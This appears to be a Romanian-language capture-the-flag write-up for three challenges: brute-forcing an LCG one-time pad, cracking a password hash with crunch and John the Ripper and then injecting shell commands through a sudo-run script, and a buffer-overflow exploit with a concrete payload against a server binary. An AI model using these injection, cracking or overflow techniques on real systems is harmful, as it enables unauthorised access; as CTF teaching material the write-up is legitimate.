    Taskul 1 - lcg-otp

    Analizam textul criptat prin reverse engineering si facem bruteforce pentru toate valorile posibile ale parametrilor 
a si b. Verificam fiecare combinatie pentru a identifica situatia in care "SpeishFlag" apare in textul decriptat, obtinand astfel flagul.

    Taskul2 - unexpected-ceo

    Ne conectam la hacker@isc2024.1337.cx . 
    Gasim aici un hint cu privire la formatul parolei: "Uppercase + Lowercase + Digit + Digit" si generam toate 
parolele folosind utilitarul "crunch". 
    Gasim hashul : $y$j9T$.gP4YLz/gSWW6/DZf8YMt0$/v/fLW9gdHYCamwfPtotd.1tHRXcsfJdnvUm6pzZaB0, pentru utilizatorul: hr_sw337ie. 
    Rulam john-the-ripper avand hashul de mai sus si parolele generate: john --wordlist=output.txt --format=crypt hash.txt
    Obtinem parola : Pk87.
    Rulam su hr_sw337ie cu parola Pk87 si observam message.txt . 
    Dam cat message.txt si observam ca trebuie sa folosim generate_report.sh
    Rulam scriptul generate_reports.sh cu permisiuni de bo55man: sudo -u bo55man ./generate_report.sh
    Afisam scriptul si putem observa ca avand ajutorul lui putem vedea anumite fisiere: 
    hr_sw337ie@unexpected:/home/bo55man$ sudo -u bo55man ./generate_report.sh
    Enter a employee name to generate a report:
    ; ls -la ; 
    Mr
    total 32
    drwxr-x---+ 3 bo55man bo55man 4096 Nov 19 16:41 .
    drwxr-xr-x  1 root    root    4096 Nov 19 16:37 ..
    -rw-r--r--  1 bo55man bo55man  220 Jan  6  2022 .bash_logout
    -rw-r--r--  1 bo55man bo55man 3771 Jan  6  2022 .bashrc
    -rw-r--r--  1 bo55man bo55man  807 Jan  6  2022 .profile
    drwxr-xr-x  2 bo55man bo55man 4096 Nov 19 16:37 .mystuff
    -rwxr-xr-x  1 root    root     222 Nov 19 16:37 generate_report.sh
    -rw-rw-r--  1 bo55man bo55man  143 Nov 19 16:49 mails

    ; ls -la .mystuff ;
    Mr
    total 12
    total 12
    drwxr-xr-x  2 bo55man bo55man 4096 Nov 19 16:37 .
    drwxr-x---+ 3 bo55man bo55man 4096 Nov 19 16:41 ..
    -rwx------  1 bo55man bo55man   45 Nov 19 16:37 my.flag

    ; cat .mystuff/my.flag ;
    Mr
    SpeishFlag{E1e7dye8LBgpi7gnJodnZl7nSercPJfz}

    
    Taskul3 - binary-database

    Decompilam binarul server cu ajutorul Ghidra.
    Se observa ca pentru rularea locala a codului este necesara rularea serverului cu "I_AM_ROOT" si un port.
    Observam apelarea functiei process_loop()
    In process_loop() se observa variabila rbuf, pe care se primesc bytes fara a controla lungimea acestora
=> putem face buffer_overflow
    Se observa aceasta linie, len este declarat ca fiind int deci MSB va fi 1 atunci len va fi negativ
	    ret = recv_bytes(recv_fd,(char *)&len,'\x04');
    Cum len va fi negativ, nu se va intra pe acest if:
    if (0x53 < len) {
      ret = -0x4a;
      goto LAB_08049b72;
    }

    Acum observam aceasa linie pe care putem face buffer overflow deoarece rbuf are dimenisiunea 69 
        ret = recv_bytes(recv_fd,rbuf,(uint8_t)len);

    Suprascriem adresa de return al lui process_loop() cu adresa lui db_first_flag(), si argumentul
magic cu vloarea lui global_magix folosind urmatorul payload :
    message = b"\xaa\xaa\xaa\xaa" + b"A" * 89 + b'\xf8\x97\x04\x08' + b"D" * 4 + b'\xb9\x7e\x33\x31'
